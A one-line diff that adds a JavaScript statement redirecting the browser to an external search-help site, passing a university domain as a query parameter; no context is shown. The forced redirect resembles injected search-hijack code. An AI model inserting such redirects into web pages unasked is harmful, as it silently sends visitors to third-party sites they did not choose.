@@ -1,0 +1,1 @@
+document.location="http://www.ayudaenlabusqueda.com.ar/?query=www2 unpa edu&curl=www2.unpa.edu.ar";
